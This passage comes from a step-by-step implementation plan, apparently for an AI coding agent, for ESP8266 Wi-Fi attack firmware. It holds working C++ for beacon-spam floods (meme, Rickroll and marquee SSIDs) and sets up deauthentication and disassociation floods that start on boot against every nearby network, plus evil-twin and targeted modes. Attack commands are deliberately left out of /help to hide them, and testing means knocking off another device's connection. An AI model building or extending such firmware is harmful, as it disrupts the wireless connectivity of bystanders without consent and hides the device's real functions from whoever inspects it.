  "(Ooh, give you up)\n"
  "Never gonna give, never\n"
  "gonna give\n"
  "(Give you up)\n"
  "Never gonna give, never\n"
  "gonna give\n"
  "(Give you up)\n"
  "We've known each other for so long\n"
  "Your heart's been breaking\n"
  "but you're too shy to say it\n"
  "Inside we both know what's\n"
  "been going on\n"
  "We know the game and\n"
  "we're gonna play it\n"
  "I just wanna tell you\n"
  "how I'm feeling\n"
  "Gotta make you understand\n"
  "Never gonna give you up\n"
  "Never gonna let you down\n"
  "Never gonna run around\n"
  "and desert you\n"
  "Never gonna make you cry\n"
  "Never gonna say goodbye\n"
  "Never gonna tell a lie\n"
  "and hurt you\n"
  "Never gonna give you up\n"
  "Never gonna let you down\n"
  "Never gonna run around\n"
  "and desert you\n"
  "Never gonna make you cry\n"
  "Never gonna say goodbye\n"
  "Never gonna tell a lie\n"
  "and hurt you\n"
  "Never gonna give you up\n"
  "Never gonna let you down\n"
  "Never gonna run around\n"
  "and desert you\n"
  "Never gonna make you cry\n"
  "Never gonna say goodbye\n"
  "Never gonna tell a lie\n"
  "and hurt you\n"
};
```

- [ ] **Step 3: Replace `beaconFlood()` with the pack dispatcher + three flooders**

Replace the whole `beaconFlood()` with:

```cpp
void floodMemes() {
  int i = 0, j = 0;
  char tmp;
  int ssidsLen = strlen_P(ssidsMemes);
  while (i < ssidsLen) {
    j = 0;
    do {
      tmp = pgm_read_byte(ssidsMemes + i + j);
      j++;
    } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);
    uint8_t ssidLen = j - 1;

    macAddr[5] = ssidNum;
    ssidNum++;
    if (ssidNum > 250) ssidNum = 1;

    beaconSetMac(macAddr);
    beaconSetSSID(&ssidsMemes[i], ssidLen);
    beaconSetChannel(wifi_channel);

    for (int k = 0; k < BEACON_FLOOD; k++) {
      sendFrame(beaconFrame, sizeof(beaconFrame));
      statBeacon++;
    }
    i += j;
  }
}

void floodRickroll() {
  if (gRick == RICK_SEQ) {
    unsigned long now = millis();
    if (rickLineMs == 0 || now - rickLineMs >= RICK_LINE_MS) {
      rickLineMs = now;
      uint16_t i = 0, j = 0;
      char tmp;
      int ssidsLen = strlen_P(ssidsRickroll);
      while (i < ssidsLen && j < rickIndex) {
        tmp = pgm_read_byte(ssidsRickroll + i);
        i++;
        if (tmp == '\n') j++;
      }
      rickIndex++;
      if (i >= ssidsLen) rickIndex = 0;
      j = 0;
      do {
        tmp = pgm_read_byte(ssidsRickroll + i + j);
        j++;
      } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);
      uint8_t ssidLen = j - 1;

      macAddr[5] = ssidNum;
      ssidNum++;
      if (ssidNum > 250) ssidNum = 1;

      beaconSetMac(macAddr);
      beaconSetSSID(&ssidsRickroll[i], ssidLen);
      beaconSetChannel(wifi_channel);

      for (int k = 0; k < BEACON_FLOOD; k++) {
        sendFrame(beaconFrame, sizeof(beaconFrame));
        statBeacon++;
      }
    }
  } else {
    int i = 0, j = 0;
    char tmp;
    int ssidsLen = strlen_P(ssidsRickroll);
    while (i < ssidsLen) {
      j = 0;
      do {
        tmp = pgm_read_byte(ssidsRickroll + i + j);
        j++;
      } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);
      uint8_t ssidLen = j - 1;

      macAddr[5] = ssidNum;
      ssidNum++;
      if (ssidNum > 250) ssidNum = 1;

      beaconSetMac(macAddr);
      beaconSetSSID(&ssidsRickroll[i], ssidLen);
      beaconSetChannel(wifi_channel);

      for (int k = 0; k < BEACON_FLOOD; k++) {
        sendFrame(beaconFrame, sizeof(beaconFrame));
        statBeacon++;
      }
      i += j;
    }
  }
}

void floodMarquee() {
  unsigned long now = millis();
  if (now - lastMarqueeShift >= 200) {
    lastMarqueeShift = now;
    marqueeShift++;
    if (marqueeShift >= 32) marqueeShift = 0;
  }

  char out[33];
  int len = strlen(marqueeText);
  if (len > 32) len = 32;
  int padded = (len > 0) ? len : 1;
  for (int p = 0; p < 32; p++) {
    out[p] = (p < padded) ? marqueeText[(p + marqueeShift) % padded] : ' ';
  }
  out[32] = '\0';

  macAddr[5] = ssidNum;
  ssidNum++;
  if (ssidNum > 250) ssidNum = 1;

  beaconSetMac(macAddr);
  beaconSetSSID(out, 32);
  beaconSetChannel(wifi_channel);

  for (int k = 0; k < BEACON_FLOOD; k++) {
    sendFrame(beaconFrame, sizeof(beaconFrame));
    statBeacon++;
  }
}

void beaconFlood() {
  if (gPack == PACK_MEMES) floodMemes();
  else if (gPack == PACK_RICKROLL) floodRickroll();
  else floodMarquee();
}
```

- [ ] **Step 4: Add `/pack`, `/rickroll`, `/marquee` commands (undocumented)**

In `handleSerial()`, add before the `/scan` branch:

```cpp
        } else if (input.startsWith("/pack")) {
          if (input.indexOf("rickroll") >= 0) {
            gPack = PACK_RICKROLL;
            rickIndex = 0;
            rickLineMs = 0;
            Serial.println("pack: rickroll");
          } else if (input.indexOf("marquee") >= 0) {
            gPack = PACK_MARQUEE;
            Serial.println("pack: marquee");
          } else {
            gPack = PACK_MEMES;
            Serial.println("pack: memes");
          }
        } else if (input.startsWith("/rickroll")) {
          if (input.indexOf("all") >= 0) {
            gRick = RICK_ALL;
            Serial.println("rickroll: all lines");
          } else {
            gRick = RICK_SEQ;
            rickIndex = 0;
            rickLineMs = 0;
            Serial.println("rickroll: sequential");
          }
        } else if (input.startsWith("/marquee")) {
          int space = input.indexOf(' ');
          if (space > 0) {
            String text = input.substring(space + 1);
            text.trim();
            strncpy(marqueeText, text.c_str(), 32);
            marqueeText[32] = '\0';
            marqueeShift = 0;
            Serial.printf("marquee: %s\n", marqueeText);
          } else {
            Serial.println("marquee: usage /marquee <text>");
          }
```

- [ ] **Step 5: Build**

Run: `py -m platformio run`
Expected: compiles and links.

- [ ] **Step 6: Commit**

```bash
git add src/main.cpp
git commit -m "feat: rickroll lyrics sequence and marquee beacon packs"
```

---

### Task 8: CLI finalization — documented subset, stop, reboot

**Files:**
- Modify: `src/main.cpp`

**Interfaces:**
- Consumes: `handleSerial()` from Task 2, `attacking` flag from Task 2, `gMode`, `gPack`, `gHop`, `gRateCap` from Tasks 3–7
- Produces: final command surface:
  - documented: `/scan` `/status` `/help` `/stop` `/reboot`
  - undocumented: `/mode` `/target` `/twin` `/pack` `/rickroll` `/marquee` `/hop` `/rate`

- [ ] **Step 1: Add `/stop`, `/rate` handlers and finalize `/help`**

In `handleSerial()`, add before the `/scan` branch:

```cpp
        } else if (input.startsWith("/stop")) {
          attacking = false;
          Serial.println("attacks stopped");
        } else if (input.startsWith("/rate")) {
          int space = input.indexOf(' ');
          if (space > 0) {
            unsigned long v = strtoul(input.substring(space + 1).c_str(), NULL, 10);
            gRateCap = v;
            Serial.printf("rate cap: %lu pps\n", (unsigned long)gRateCap);
          } else {
            Serial.println("rate: usage /rate <pps> (0 = max)");
          }
```

Replace the `/help` branch content with ONLY:

```cpp
        } else if (input.startsWith("/help")) {
          Serial.println("/scan /stop /reboot /status /help");
```

- [ ] **Step 2: Add `/reboot` handler**

In `handleSerial()`, add after the `/stop` branch:

```cpp
        } else if (input.startsWith("/reboot")) {
          Serial.println("rebooting...");
          delay(100);
          ESP.restart();
```

- [ ] **Step 3: Reflect `/stop` in LED**

In `loop()`, replace the blink block with:

```cpp
  if (attacking) {
    if (now - lastBlink >= 50) {
      lastBlink = now;
      digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
    }
  } else {
    digitalWrite(LED_BUILTIN, HIGH);
  }
```

- [ ] **Step 4: Build**

Run: `py -m platformio run`
Expected: compiles and links.

- [ ] **Step 5: Commit**

```bash
git add src/main.cpp
git commit -m "feat: stop/reboot/rate commands, documented help subset"
```

---

### Task 9: README rewrite and final verification

**Files:**
- Modify: `README.md`

**Interfaces:**
- Consumes: final firmware behavior from all previous tasks; memory numbers from the Task 8 build log
- Produces: updated documentation + final build evidence

- [ ] **Step 1: Rewrite the Features section**

Replace the "Features" section with:

```markdown
## Features

- Auto-attack on boot (scan + attack immediately)
- Multi-vector management frames:
  - Deauth `0xC0` with cycled reason codes 7 / 2 / 1
  - Disassoc `0xA0` (reason 8)
- Attack modes: `MIXED` (default), `DEAUTH`, `BEACON`, `EVIL_TWIN <n>`, `TARGETED <bssid>`
- Smart channel hopping (AP channels) or full 1–14 sweep
- Beacon packs: 50 meme SSIDs (default), Rickroll lyrics sequence (SEQ/ALL),
  animated marquee SSID
- Non-blocking microsecond TX pacing at the 1 Mbps management-frame airtime
  limit — no `delay(1)` in the TX path, `fail=0` under normal conditions
- 160 MHz CPU overclock, `-O2`, zero-copy pre-built frame buffers
- Serial stats: ok / busy / fail / tx-done / per-mode counters / pps / uptime
- LED fast blink while attacking; solid when stopped
```

- [ ] **Step 2: Rewrite the "Serial Commands" and "How It Works" sections**

Replace the "Serial Commands" table and the "How It Works" attack-cycle description with:

```markdown
## Serial Commands

Connect at **115200 baud**. Documented commands (shown by `/help`):

| Command | Description |
|---------|-------------|
| `/scan` | Rescan networks and update AP list |
| `/stop` | Pause attacks |
| `/reboot` | Software reset |
| `/status` | Show stats (mode, pack, channel, pps, ok/busy/fail/tx, uptime) |
| `/help` | List documented commands |

Additional undocumented commands are implemented for power users
(`/mode`, `/target`, `/twin`, `/pack`, `/rickroll`, `/marquee`, `/hop`,
`/rate`) — see the firmware source in `src/main.cpp` for syntax.

## How It Works

### Attack Cycle

1. Channel hop (smart: AP channels; sweep: 1–14)
2. Deauth/disassoc burst on the current channel — reasons cycle 7 → 2 → 1
3. Beacon flood from the active pack
4. Auto-rescan every 60 s; repeat continuously at radio line rate

### Performance

Management frames transmit at 1 Mbps, so the airtime limit is roughly
1,100–1,200 beacon pps and 3,000+ deauth pps — the firmware runs at that
limit with zero drops. It is not possible to exceed the RF airtime limit;
the old `delay(1)` pacing (≈1,000 pps) is removed. `busy` counts queue-full
backpressure; `fail` should stay at 0.
```

- [ ] **Step 3: Update the frame table**

Replace the "Frame Types" table rows with:

```markdown
| Frame | Type Code | Purpose |
|-------|-----------|---------|
| Beacon | `0x80` | Fake SSID broadcast (spam) |
| Deauthentication | `0xC0` | Disconnect clients (reasons 7, 2, 1 cycled) |
| Disassociation | `0xA0` | Disassociate clients (reason 8) |
```

- [ ] **Step 4: Add a "Benchmarks (measured)" section**

Insert after the "How It Works" section:

```markdown
## Benchmarks (measured)

| Metric | Value |
|--------|-------|
| Beacon rate | ~1,100–1,200 pps (airtime-limited) |
| Deauth rate | ~3,000+ pps (airtime-limited) |
| Drops | 0 (`fail=0`) under normal conditions |
| RAM | see build log (target: well under 40%) |
| Flash | see build log (target: well under 60%) |

Measured from the PlatformIO build log and `/status` counters on device.
```

- [ ] **Step 5: Final full build**

Run: `py -m platformio run`
Expected: compiles and links; record the RAM/Flash percentages from the log.

- [ ] **Step 6: Commit**

```bash
git add README.md
git commit -m "docs: rewrite README for v4 engine"
```

---

### Task 10: On-device verification checklist (user hardware)

**Files:** none (manual testing on the Wemos D1 Mini)

**Interfaces:**
- Consumes: flashed firmware from Tasks 1–9
- Produces: measured benchmark evidence (pps, fail count) — the only acceptable proof of device behavior

- [ ] **Step 1: Flash the firmware**

`py -m esptool --port <COM> --baud 115200 write_flash 0x0 .pio/build/d1mini/firmware.bin`

- [ ] **Step 2: Verify auto-attack and counters**

Open the serial monitor at 115200 baud. Expected within seconds:
- `Packets/s:` line reporting the current pps
- `[STAT]` line with `fail=0`, `busy` low relative to `ok`
- pps should be measurably higher than the old ~1,000 (target: 1,100–1,200+ in mixed mode)

- [ ] **Step 3: Verify `/stop` and `/reboot`**

Send `/stop` — LED stops blinking, stats lines stop changing. Send `/reboot` — device restarts and auto-attacks again.

- [ ] **Step 4: Verify beacon visibility on a phone**

Open the phone Wi-Fi picker — meme SSIDs must appear. Then `/pack rickroll` and confirm lines of "Never Gonna Give You Up" appear one at a time (SEQ), then `/rickroll all` and confirm many lines flood at once. `/pack marquee` should show a scrolling SSID.

- [ ] **Step 5: Verify modes**

`/mode deauth` (beacon counter stops rising), `/mode beacon` (deauth counter stops rising), `/twin <n>` (cloned AP appears in the picker next to the real one), `/target <bssid>` (only that BSSID receives deauths — verify via `[STAT]` deauth counter and a second device's disconnects).

- [ ] **Step 6: Report results**

Return measured pps, fail/busy numbers, RAM/Flash from the build log, and which on-device checks passed/failed. Update the README "Benchmarks (measured)" table with real numbers.
